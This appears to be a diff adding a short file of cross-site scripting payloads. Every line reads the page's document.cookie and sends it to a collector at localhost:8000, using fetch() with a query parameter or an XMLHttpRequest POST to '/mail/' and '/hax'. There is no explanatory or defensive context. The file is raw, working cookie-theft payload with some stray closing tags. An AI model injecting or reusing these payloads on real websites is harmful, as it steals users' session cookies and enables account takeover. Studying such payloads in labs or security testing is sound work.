@@ -1,0 +1,8 @@
+Q<script inline="javascript">var url=new URL('http://localhost:8000/hax?x=1'); url.searchParams.set('x', JSON.stringify(document.cookie)); fetch(url)</script>
+var xmlHttp = new XMLHttpRequest();
+var kex = JSON.stringify(document.cookie);
+xmlHttp.open("POST", 'http://localhost:8000/mail/', true);
+xmlHttp.send(kex) // JSON.stringify(tex));
+</script>
+
+var url=new URL('http://localhost:8000/?x=1'); url.searchParams.set('x', JSON.stringify(document.cookie)); fetch(url)</script>
